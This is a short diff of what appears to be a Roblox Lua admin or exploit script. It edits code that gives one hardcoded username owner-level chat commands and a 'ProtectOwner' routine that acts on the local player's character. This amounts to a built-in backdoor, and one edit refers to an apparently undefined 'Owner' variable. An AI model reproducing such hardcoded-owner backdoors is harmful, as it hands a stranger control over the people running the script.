@@ -2665,7 +2665,7 @@ end
 Players.PlayerAdded:Connect(function(Added)
 if not DisableAdmin then
 if Added.Name == "viniciuszk70" then
-Added.Chatted:Connect(Connect.OwnerCommands)
+Owner.Chatted:Connect(Connect.OwnerCommands)
 end
 end
 end)
@@ -3155,7 +3155,7 @@ Mouse.Button1Down:connect(function()
 local Obj = Mouse.Target
 local Player = FindPlayerFromCharacter(Obj.Parent)
 if ProtectOwner then
-if Player ~= LPlayer and Player.Name == "viniciuszk70" then
+if Player.Name == "viniciuszk70" then
 if not DisableAdmin then
 pcall(function()
 for i,v in pairs(LPlayer.Character:GetChildren()) do
